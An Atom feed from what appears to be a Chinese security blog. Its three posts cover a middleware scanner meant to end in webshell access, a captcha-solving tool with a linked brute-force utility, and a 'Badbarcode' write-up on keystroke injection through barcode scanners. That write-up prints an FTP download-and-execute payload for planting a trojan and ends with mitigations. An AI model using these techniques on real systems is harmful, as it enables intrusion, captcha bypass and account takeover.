<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>dushutest</title>
  <subtitle>hack f4ck</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://dushutst.com/"/>
  <updated>2017-07-01T22:32:36.346Z</updated>
  <id>http://dushutst.com/</id>
  
  <author>
    <name>dushu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>中间件漏洞检测框架(F-MiddlewareScan)</title>
    <link href="http://dushutst.com/year/03/16/2016-03-17-MiddlewareScan.html"/>
    <id>http://dushutst.com/year/03/16/2016-03-17-MiddlewareScan.html</id>
    <published>2016-03-16T16:00:00.000Z</published>
    <updated>2017-07-01T22:32:36.346Z</updated>
    
    <content type="html"><![CDATA[<div class="image-strip"><br><img src="https://s3.amazonaws.com/ptsteadman-images/hexo.png"><br></div>

<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>实现针对中间件的自动化检测，端口探测-&gt;中间件识别-&gt;漏洞检测-&gt;获取webshell<br>参数说明<br>-h 必须输入的参数，支持ip(192.168.1.1)，ip段（192.168.1），ip范围指定（192.168.1.1-192.168.1.254），最多限制一次可扫描65535个IP。<br>-p 指定要扫描端口列表，多个端口使用,隔开 例如：7001,8080,9999。未指定即使用内置默认端口进行扫描(80,4848,7001,7002,8000,8001,8080,8081,8888,9999,9043,9080)<br>-m 指定线程数量 默认100线程<br>-t 指定HTTP请求超时时间，默认为10秒，端口扫描超时为值的1/2。</p>
<p>例子：<br><code>python F-MiddlewareScan.py -h 10.111.1</code><br><code>python F-MiddlewareScan.py -h 192.168.1.1-192.168.2.111</code><br><code>python F-MiddlewareScan.py -h 10.111.1.22 -p 80,7001,8080 -m 200 -t 6</code></p>
<p>效果图：<br>scan.jpg</p>
<p>漏洞检测脚本以插件形式存在，可以自定义添加修改漏洞插件，存放于plugins目录，插件标准非常简单，只需对传入的IP，端口，超时进行操作，成功返回“YES|要打印出来的信息”即可。<br>新增插件需要在 plugin_config.ini配置文件中新增关联（多个漏洞插件以逗号隔开）。<br>中间件识别在discern_config.ini文件中配置（支持文件内容和header识别）</p>
<p>目前内置了19个漏洞插件，希望大家可以一起编写更多的插件，目前还缺少weblogic自动部署和反序列化探测以及中间件的反序列化自动获取webshell的插件等等。</p>
<p>下载地址：<a href="http://down.future-sec.com/F-MiddlewareScan.rar" rel="external nofollow noopener noreferrer" target="_blank">http://down.future-sec.com/F-MiddlewareScan.rar</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;div class=&quot;image-strip&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://s3.amazonaws.com/ptsteadman-images/hexo.png&quot;&gt;&lt;br&gt;&lt;/div&gt;

&lt;h2 id=&quot;Setup&quot;&gt;&lt;a href=&quot;#Setup&quot; clas
    
    </summary>
    
      <category term="Python" scheme="http://dushutst.com/categories/Python/"/>
    
    
      <category term="python" scheme="http://dushutst.com/tags/python/"/>
    
      <category term="端口探测" scheme="http://dushutst.com/tags/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>简单验证码识别及工具编写思路</title>
    <link href="http://dushutst.com/year/03/06/2016-03-07-qrcode.html"/>
    <id>http://dushutst.com/year/03/06/2016-03-07-qrcode.html</id>
    <published>2016-03-06T16:00:00.000Z</published>
    <updated>2017-07-01T22:30:59.773Z</updated>
    
    <content type="html"><![CDATA[<p>此文已在乌云首发：<a href="http://drops.wooyun.org/tips/13043" rel="external nofollow noopener noreferrer" target="_blank">http://drops.wooyun.org/tips/13043</a></p>
<p>Author:crystal_lz@伏宸安全实验室</p>
<p>注：此文章只适合简单验证码，最后也将编写的工具附上以及关键部分代码和使用说明文档</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>虽然验证码发展到如今有许多人类都难以识别的状态了，但人有部分老系统使用的验证码异常的简单。还有一些网站由于程序员本身的素质或者缺乏相关图像相关的知识，所以并没有自己写验证码的生成程序，而是直接在网上随便复制粘贴一个Demo级别的代码来用，以达到网站有验证码的目的，而忽略了验证码的强弱性，导致很多网站的验证码都是爆款弱验证码</p>
<p>如：</p>
<p>还有更傻缺的比如：</p>
<p>直接就能复制的…这种是完全不知道验证码的意义或者为了应付而做的验证码</p>
<p>##处理方式</p>
<p>好吧忽略上面的图继续说</p>
<p>对于那些简单验证码他们的共同点是</p>
<pre><code>&apos;标准字体
背景单简单甚至纯色没有背景
字体并没有粘贴在一起&apos;
</code></pre><p>而本文讨论的就是这类的验证码。对于那种连背景都没有的纯色、标准字体、没有黏贴的那种再简单不过了直接就是100%的识别率</p>
<p>这种就不讨论了 下面来看看wooyun的验证码</p>
<p>Wooyun的验证码有两种状态</p>
<p>一种是白色文字深色背景 一种是黑色文字浅色背景<br>如果只有一种无论是那种设定一个阀值都能很好的二值化 但现在的情况却是有两种 所以我能想到的最简单的方式 那好 我就给出两个阀值 对于黑色文字我就用一个较小一点的阀值 对于白色文字我就用一个较大一点的阀值<br>但是这样还是会出现一个问题 白色文字二值化后背景黑色文字白色 而黑色文字二值化后背景白色文字黑色 就像下面一下<br>可以看出上面我左边框选区域一切正常 而右边却出了问题 那是因为在我写程序的时候我认为二值化后文字都是黑色背景是白色 所以我就把黑色区域当作文字来框选就看到了如上的效果 所以说这是一个问题 不仅要二值化二值化后还要到底白色是文字还是黑色是文字<br>于是我又想到一种办法 通常情况下一张图上背景的面积都会大于文字所占用的面积 所以在二值化的同时我还做了一件事情 二值化的同时记录下黑点个数和白点个数 如果黑点的个数大于了白点的个数那么我就把黑白反色一下让黑色像素点变成最少 这样再把黑色像素当作文字处理<br>这样做还有一个问题就是 我应该怎么知道什么时候应该使用那一个阀值来二值化 当然办法可以有很多 比如当图像上深色像素多余浅色像素的时候使用较大阀值 否则相反 不过我并不是这样做的</p>
<p>在工具上我提供了一个框让用户输入验证码的字符个数 这样的话我对体统的阀值挨个遍历 二值化后去识别区域 如果框出来的区域个数是有问题的 那么就换下一个阀值 如果所有阀值都遍历完了还是有问题 那么这验证码确实也是超出这个工具的范围了 因为这个工具的目的是通用 对于那些需要单独写代码来识别的不在他的能力范围内</p>
<p>在这之前一些验证码可能还需要一些处理比如很常见的一些验证码有边框的</p>
<p>左边是没有裁剪的边框一起被二值化成为了黑色 然后拆字就悲剧了 右边是裁剪掉了一个像素的把边框去掉了 然后就一切正常了 这种情况就不说了 都懂的</p>
<p>还有一种比较复杂的情况 因为二值化并不是万能的 并不是说什么验证码一进行二值化后文字和背景就出来了 下面这张图是我以前程序需要做的百度推广的验证码识别</p>
<p>上面这张图不怎么能看到效果 因为都是好几年前的事情了 验证码连接访问已经是500了 这张图都是测试的时候的截图</p>
<p>我描述一下情况吧 上面的验证码 首先有边框 文字 干扰线 即使能把边框裁剪掉也找不到一个合适的阀值来把线条和文字分离 很简单因为他的线条的颜色比文字的颜色深 如果我的阀值太小 那么我的文字就没有了 只会剩下一些线条在哪里</p>
<p>这图为上面那张图片上验证码的NZ两个字符在ps中放大的效果(尽管上面图像原来并非保存的png格式已经失真 但大概还是能看到点什么的) 我也去翻了翻以前的代码来看 当初我二值化的时候并非直接二值化的 在二值化之前还单独对RGB进行了判断 代码截图如下</p>
<p>别百度推广的验证码是我做的第一个验证码识别程序 所以我一直记得很清楚 不是一个二值化就能搞定的 所以说在这个工具中我也加入了同样可以单独处理RGB的功能</p>
<p>由于百度的这个验证码已经访问不了了 所以我找了一个同样有线条的验证码 但是这个验证码线条颜色比文字颜色浅 所以我就用默认的127作为阀值 假设二值化无法搞定</p>
<p>用127阀值上面线条一起被黑化了 但是图片中文字颜色接近黑色而线条颜色却要浅一点 所以判断的时候 可以认为RGB的平均值大于20的就视为背景 就可以这样干<br>然后效果就成了这样</p>
<p>这样线条就被处理掉了 不过这个验证码直接设置阀值就能搞定 只是为了说明所以采用127作为阀值 还有一点这个验证码和百度的那个 他们线条都是在文字的下方 如果是在文字上方 那么同样的超出了这个工具的范围 对于线条在上方的 我想过一些处理方式 假设线条为红色的时候 我在遍历的时候遇到一个红色像素点 我就把红色像素设置为和他相邻像素的非红色的颜色 但是我想了一想这个“相邻”就涉及了它周围八个像素点 我应该取那一个像素点的颜色 如果是在背景上还好 他周围应该都是背景的颜色 那一个都无所谓 可是如果是在线条、背景还有文字的交界处就不好处理了 所以工具里面暂时还没提供这样的功能 还有那种很难分离背景或者字黏贴在一起的但是每个文字都是一个颜色的那种 也想过一些处理方式 但是实现起来我感觉都会纯在一些小问题 所以就还展示没有做 就不扯那么多了 等做好了再来扯 才比较有证据</p>
<h2 id="拆字和识别"><a href="#拆字和识别" class="headerlink" title="拆字和识别"></a>拆字和识别</h2><p>下面来说说验证码识别中的一个难点 -&gt; 拆字</p>
<p>基本上在我看来 能正确的拆字 那么就已经成功了80%了 因为剩下的就是比对的问题了 我在工具中只提供了两种方式拆字</p>
<p>手动添加就不用说了 我这里的自动识别是最传统的深度遍历 从图像的第一个像素点开始遍历 因为图像已经二值化 按照我的工具的理解 就只剩下白色背景和黑色文字 所以遇到一个黑色像素点的时候开始记录 然后开始深度遍历 大概效果如下</p>
<p>这是个GIF_p16</p>
<p>大概代码如下</p>
<p>对于拆字还有很多其他的方式 这里只是最普通的也是最简单的一种 对于其他方式这个工具中并没有提供 因为工具只针对简单通用的验证码 对于那种需要单独写代码的验证码不考虑 而且工具上功能附加太多也就变得复杂了 其实重点就是感觉有点付出和回报不成正比 而且对于那些流传的拆字理论知识 说起来确实简单 但是实际做的时候才会发现 这些理论其实是存在漏洞的 只会在特定条件下才会成立 而验证码却是变幻多端的 这里也就不扯那么多了</p>
<p>剩下来的就是识别了 我采用的识别方式比较简单 就是两张图来对比 一张是验证码上面截取出来的图像 一张是已知的样本图像</p>
<p>调用函数会返回这两张图的重叠的像素的个数 这样我把截取出来的验证码字符和我所有的样本对比一次 取出nCount最高的一个 作为结果 也就是说取出和样本中重叠率最高的一个出来作为结果 在工具中我有两种方式提供样本 一种是使用系统的字体 一种是手动采集</p>
<p>如果使用系统字体在文本框内输入验证码可能出现的字符 然后点击 生成 会弹出系统对话框设置字体从而产生样本 不过对于一些非标准字体 系统字体就很难搞定了 无论是标准字体还是非标准的字体都建议使用手动采集的方式 因为直接从验证码上截取下来的图怎么说也是原配 重复的图片工具也只会采集一次不会重复添加降低效率比对 下面就是一个非标准字体</p>
<p>理论上来说 样本采集越多越全 识别率就越高 反正我每次都是使用的手动采集样本 对了这个工具只是一个配置工具而已 并不能用来做什么其他事情 当一切都配置好了之后就可以点击工具上的 文件 -&gt; 保存 将这些所有的配置 保存成一个文件 可以保存为两种后最(.ci和.ci.png) 后者以图片保存方便电脑上查看</p>
<p>而识别是另一个独立的工具调用 如果是.NET则直接调用提供的dll来识别 之所以这样设计是因为 我并不知道别人 会用验证码识别来做什么事情 所以除了识别以外我也不知道别人想要什么功能 所以把所有东西全部独立出来共别人调用或者使用 对于识别我提供了一个命令行调用工具供给非.NET平台的程序调用</p>
<p>以python举例：<br>‘</p>
<h1 id="coding-UTF-8"><a href="#coding-UTF-8" class="headerlink" title="coding: UTF-8"></a>coding: UTF-8</h1><p>import os<br>result = os.popen(‘verifytool.exe D:\woo.ci.png -f D:\woo-verify.png’).readlines()<br>print (result)’</p>
<p>在我的D盘有这样一张图</p>
<p>这样别人就可以自己写脚本去做自己爱做的事情 不过我还是建议使用-p的方式来调用<br>‘</p>
<h1 id="coding-UTF-8-1"><a href="#coding-UTF-8-1" class="headerlink" title="coding: UTF-8"></a>coding: UTF-8</h1><p>import urllib2<br>from socket import *</p>
<p>h = urllib2.urlopen(‘<a href="http://www.wooyun.org/captcha.php" rel="external nofollow noopener noreferrer" target="_blank">http://www.wooyun.org/captcha.php</a>‘)<br>str = h.read()                      #获取验证码<br>s = socket(AF_INET,SOCK_DGRAM);<br>s.sendto(str,(‘localhost’,14250))   #将获取到的验证码发送给识别程序<br>code = s.recvfrom(65500)            #接受识别出来的验证码<br>print(code)<br>‘</p>
<p>如果程序是.NET平台编写 则可直接使用VerifyReader.dll文件 将其添加引用然后：</p>
<p>CodeInfo ci = CodeInfo.LoadFromFile(“D:\woo.ci.png”);<br>CodeHelper helper = new CodeHelper(ci);<br>string code = helper.GetCodeString(Image.FromFile(“D:\woo-verify.png”));</p>
<p>另外这里还单独的做了一个账户爆破的工具出来</p>
<p>以下是用自己测试的结果</p>
<p>双击列表即可查看数据</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>全套工具及核心代码和使用说明下载连接：<a href="http://down.future-sec.com/VerifyReader-1.1.zip" rel="external nofollow noopener noreferrer" target="_blank">http://down.future-sec.com/VerifyReader-1.1.zip</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此文已在乌云首发：&lt;a href=&quot;http://drops.wooyun.org/tips/13043&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;http://drops.wooyun.org
    
    </summary>
    
      <category term=".net" scheme="http://dushutst.com/categories/net/"/>
    
    
      <category term="qrcode" scheme="http://dushutst.com/tags/qrcode/"/>
    
      <category term="验证码" scheme="http://dushutst.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>一维条形码攻击技术(Badbarcode)</title>
    <link href="http://dushutst.com/year/02/24/2016-02-25-Badbarcode.html"/>
    <id>http://dushutst.com/year/02/24/2016-02-25-Badbarcode.html</id>
    <published>2016-02-24T16:00:00.000Z</published>
    <updated>2017-07-01T22:31:13.151Z</updated>
    
    <content type="html"><![CDATA[<p>Author:数据流@伏宸安全实验室</p>
<p>本文已在乌云知识库首发 <a href="http://drops.wooyun.org/tips/12183" rel="external nofollow noopener noreferrer" target="_blank">http://drops.wooyun.org/tips/12183</a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主 在PacSec介绍的条形码攻击和twitter上的demo视频太炫酷，所以就自己买了个扫码器自己研究了一下 ，在研究时候也找遍了国内外所有资料，但是都没有对可以执行的攻击技术完整的文章，故有此文分享。 : )<br>0x01 条形码介绍</p>
<p>p1</p>
<p>条形码(barcode)是将宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符。常见的条形码是由反射率相差很大的黑条（简称条）和白条（简称空）排成的平行线图案。</p>
<p>常见的条形码类型有code39 code128 code93 EAN128 EAN13 QR等，前面大部分是一维条形码，而QR则是二维条形码，本文重点针对支持一维条形码的扫码器。其中code128是使用最广泛，支持字符最多的一种类型，一般都利用code128条形码进行攻击。<br>0x02 扫码器介绍</p>
<p>p2</p>
<p>扫码器，大家几乎每天都能看到，在超市付账，物流，医院，彩票等。作用就是把条形码的信息提取出来，而常规的扫码器的工作原理是利用红外线照射，然后反射得出条形码的信息，再用扫描器内置的芯片处理得出结果。国际上常用的扫描器品牌有Symbol，Honeywell，Datalogic等，其中symbol已被摩托罗拉收购。</p>
<p>大家在超市购物付账时候都注意到，商品通过扫描后，商品的编码直接显示在屏幕上，其实很多扫码器都是用keyboard的方式输入的，也就是说一个扫描器就相当于一个键盘，这是一个较大的风险。</p>
<p>p3</p>
<h3 id="Code128条形码"><a href="#Code128条形码" class="headerlink" title="Code128条形码"></a>Code128条形码</h3><p>既然知道扫描器是一个keyboard设备，只要控制条形码的数据就可以随意输入键盘数据了。但例如UPC条形码只支持数字，有些则只支持数字与字母，而Code128 是一种广泛使用的条形码类型，因为它支持ASCII 0-127字符，所以叫code128，条形码长度可调，最大支持232个字符。</p>
<p>Code128也分为三种：</p>
<pre><code>Code128A：标准数字和大写字母，控制符，特殊字符
Code128B：标准数字和大写字母，小写字母，特殊字符
Code128C/EAN128：[00]-[99]的数字对集合，共100个，即只能表示偶数位长度的数字。
</code></pre><p>Code128由四部分组成:起始码，数据码，校验码(可有可无)，结束码</p>
<p>p4</p>
<p>如上条形码，黑白相间，且线条粗细不一；由黑色线条(条，Bar)与空白(空，Space)组成，根据粗细程度，可以将以上条形码起始码解读为:211214；第一条黑色竖线是由两个单位的竖线合并组成，而第二条空白竖线即由一个单位的竖线，如此类推。一般前6条的Bar与Space为一个单元。211214 用1,0转成逻辑码就是11010010000，也即是起始码。</p>
<p>起始码对照：</p>
<pre><code>128A 11010000100
128B 11010010000
128C 11010011100
</code></pre><p>结束码都是统一的1100011101011</p>
<p>根据上面的解读出的逻辑码11010010000，就可以推断上面那个条形码是属于code128-B类型了。</p>
<p>p5</p>
<p>p6</p>
<p>最后再根据code128的编码表就可以分析出条形码的数据（编码表太长就不贴完了）<br>0x04 控制字符与条形码生成</p>
<p>根据上面分析的code128规则，已经可以自己写出一个读取识别和生成条形码的程序了。而我们是要执行操作，最简单的就是利用控制字符。控制字符即非显示字符，例如回车，换行，制表符等。在ASCII中，0-31和127 就是控制字符。</p>
<p>p7</p>
<p>根据ASCII的控制字符表，可以看出Ctrl+?的组合键几乎都有了，例如Ctrl+O，也就是打开文件，但这个只是局部快捷组合键，在一些程序中才能应用，例如浏览器，word等等，利用这些控制字符在某些终端可以使程序跳出沙盒。如何生成可以使计算机执行Ctrl+O的条形码？因为已经上面已经介绍过code128的规则算法，自己写程序也可以。网络也有很多条形码生成的小程序，但在这里推荐一个强大的条形码编辑工具：BarTender</p>
<p>p8</p>
<p>下载安装后点击菜单栏“文件”-“新建”-“完成”，就会出现一个空白模板。</p>
<p>p9</p>
<p>然后点击条形码按钮就可以创建自己的条形码，选择code128类型。</p>
<p>p10</p>
<p>利用BarTender轻松就可以生成出条形码，而且字符可以随时改动，方便调试。扫描上图就验证码后，会输入“FutureSec”，然后输入控制字符Ctrl+O</p>
<p>p11</p>
<p>扫码器扫描后立即弹出对话框</p>
<p>市面上基本任何一款扫码器都能执行，因为code128是绝大部分扫码器都支持的。<br>0x05 Advanced Data Formatting（高级数据格式）</p>
<p>Advanced Data Formatting（ADF），高级数据格式。是摩托罗拉针对扫描器开发的一种更高级的数据输入，根据自己的设定一步一步的规则可以自定义输入的数据，也可以说是一种支持编程的条形码技术。</p>
<p>例如，在一个结账系统中，当你对一个商品扫描后，由于该结账系统不能直接对该条形码直接处理，就需要这种技术。结账系统识别码：A12345，前面要A开头；条形码的数据类型：12345 纯数字，想要在这个结账系统中识别就要在输入前进行处理。</p>
<p>再举个例子：</p>
<p>条形码的数据：</p>
<p>8523647122</p>
<p>通过ADF输出的数据：</p>
<p>8523641<enter></enter></p>
<p>如何实现ADF？</p>
<p>p12</p>
<p>现在网上仍然没有ADF的中文资料，而在外国的网站也寥寥无几，无人问津，但靠tk的ppt中提到的ADF也是一头雾水，因为没有具体技术描述，只是一行字带过。后来找到一份摩托罗拉撰写300多页的ADF指南PDF。</p>
<p>ADF是一种编程，根据自己的需求构建规则，而用的就不是用代码进行编程而是条形码。ADF把所有规则都用条形码表示，例如Perfix/Suffix，Replace，字符输入等。</p>
<p>利用ADF挟持扫描器数据</p>
<p>对扫描器进行ADF设置时要先扫描开始模式，Begin New Rule</p>
<p>p13</p>
<p>此后开始扫描的条形码都会被添加规则，前提是规则的逻辑是合法的。</p>
<p>随后依次扫描下列条形码</p>
<p>p14</p>
<p>p15</p>
<p>p16</p>
<p>p17</p>
<p>然后Save Rule</p>
<p>p18</p>
<p>当Save Rule，扫描器的输出数据都会被挟持成“TEST”，当你设置了ADF时，就会把你的规则按流程一步一步执行。</p>
<p>如何恢复？</p>
<p>p19</p>
<p>扫描清除所有规则条形码即可。<br>0x06 利用ADF执行命令，种植木马</p>
<p>由于单凭控制字符无法执行命令，而ADF支持简单的编程和更多的键，利用ADF可以轻松执行系统命令。由于ADF支持很多键，例如最有用的WIN+R。</p>
<p>p20</p>
<p>在ADF中称为GUI R，既然知道了可以WIN+R的键，利用上面的规则就可以弹出cmd执行了。但这样还是不行，因为输入的是由系统自动输入，速度是手打无法可比的，当你执行到GUI R，再执行”c”,”m”,”d”，win+r的对话框还没有出来就已经输入了cmd，所有要延时，而ADF就支持，相当于编程中的sleep()。</p>
<p>p21</p>
<p>在录ADF规则时，扫描延时后要输入两个Numeric，例如依次0和1两个码，就代表延时0.1秒，0和5就代表0.5秒，默认是延时1秒。</p>
<p>知道这些ADF条形码后就可以构建弹出cmd，然后再利用控制字符执行命令，主要是Enter。但如果要按照以上这么搞的话，仅是弹出一个cmd窗口就要十多个条形码了，也就是说扫描器要扫十多次。可以先看看腾讯玄武实验室的demo视频：</p>
<p><a href="https://twitter.com/tombkeeper/status/663730674017300480" rel="external nofollow noopener noreferrer" target="_blank">https://twitter.com/tombkeeper/status/663730674017300480</a></p>
<p>视频中用了一叠条形码，依次扫描，扫描了十多次就出来个cmd，可能这与扫描器型号也有关系。</p>
<p>p22</p>
<p>这样的话不管是规则生成和利用都非常繁琐，其实是可以优化的，ADF的规则可以合并。利用motorola的扫描器软件123scan。</p>
<p>p23</p>
<p>123scan是摩托罗拉官方出品非常强大的扫描器管理软件，在其官网可以下载。功能很多，在这里就介绍利用123scan设置ADF。</p>
<p>打开后点击”Create new configuration file”-&gt;”My scanner is NOT connected”-&gt;选择扫描器-&gt;”Mondify data”-&gt;”Program complex data modifications”-&gt;”Create a new rule”。</p>
<p>p24</p>
<p>点击Add action就是添加规则。</p>
<p>p25</p>
<p>ADF所有规则都在里面，包括Beep控制（控制扫描器蜂鸣），Replace等。</p>
<p>p26</p>
<p>设置延时0.5秒，依次添加规则。</p>
<p>p27</p>
<p>最后会自动合并条形码并输出。</p>
<p>p28</p>
<p>以上就是执行任意命令的条形码payload，除去1和2的设置出厂设置和清除所有规则，只需要4个条形码就可以执行任意单条命令。其中Send ALL that remains是代表设置ADF后扫描条形码的原本数据。 以上四组条形码的ADF流程是:输入WIN+R键-&gt;延时0.5秒-&gt;输入c键-&gt;输入m键-&gt;输入d键-&gt;输入回车-&gt;延时0.5秒-&gt;执行条形码的内容，而随后的Send ALL that remains就是你要执行的命令，可以多行命令，要是单行命令基本上4条就够不需要加Send ALL that remains。</p>
<p>利用ADF种植木马</p>
<p>既然已经可以执行cmd命令，最简单的方法就是利用ftp下载执行任意程序。上面提到的Send ALL that remains可以用BarTender生成出FTP命令。</p>
<p>p29<br>1</p>
<p>ftp test«CR»a«CR»a«CR»get w.exe«CR»bye«CR»w.exe«CR»get w.exe«CR»bye«CR»w.exe«CR»</p>
<p>下面给出我们的demo视频，是已经经过扫描四次ADF设置后。不管扫描什么条形码执行到Send ALL that remains。视频中是利用FTP命令执行。</p>
<p>（测试型号Symbol-LS4208-SR20001ZZR）</p>
<p><a href="http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2" rel="external nofollow noopener noreferrer" target="_blank">http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2</a></p>
<p>密码:wooyun520</p>
<h3 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h3><p>简单总结一下可能存在攻击的场景地点:</p>
<p>1.商店付款</p>
<p>p30</p>
<p>直接把条形码替换到商品；很多便利店支持微信，支付宝二维码支付，扫描器也支持多个类型条形码，可以直接把条形码存在手机中，让其扫描；有些大型百货有资助价格查询终端，只要用特殊的条形码到终端一扫就能跳出终端。</p>
<p>2.医院病历，检验单</p>
<p>p31</p>
<p>现在医院的挂号，病历都会有个条形码，直接到医院自主终端或直接递给护士扫描；去医院都知道，有资助出检验单的终端，只要一扫就会单子，基本每个医院都有了。</p>
<p>p32</p>
<p>3.彩票</p>
<p>p32</p>
<p>彩票自身都会有条形码，兑换彩票就凭靠条形码到机器识别，所以伪造或对检验机进行攻击还是有可能，彩票终端类型这么多。</p>
<p>p33</p>
<p>4.快递单子</p>
<p>p34</p>
<p>快递都有条形码，一般是code128或者code39类型。在一些快递自助取件柜，和快递小哥扫描的时候或许会出现风险。</p>
<p>p35</p>
<p>。。。。。。</p>
<p>场景很多就不一一列举了，以上场景有空我会逐一分析。</p>
<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><pre><code>扫码器默认不要开启ADF功能
扫描器尽量不要使用键盘模拟
设置热键黑名单
</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>一维条形码攻击的概念在国外很多年前就有提出了，但是没人深入研究。利用条形码也可能出现SQL注射，XSS，溢出等攻击。</p>
<p>无论什么设备，只要能控制一部分输入，就存在风险！</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><pre><code>http://www.appsbarcode.com/code%20128.php Code 128 條碼．編碼規則
http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-badbarcode-en1109nocommentfinal PacSecJP-badbarcode-tk
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Author:数据流@伏宸安全实验室&lt;/p&gt;
&lt;p&gt;本文已在乌云知识库首发 &lt;a href=&quot;http://drops.wooyun.org/tips/12183&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_b
    
    </summary>
    
      <category term="Badbarcode" scheme="http://dushutst.com/categories/Badbarcode/"/>
    
    
      <category term="code" scheme="http://dushutst.com/tags/code/"/>
    
      <category term="python" scheme="http://dushutst.com/tags/python/"/>
    
  </entry>
  
</feed>
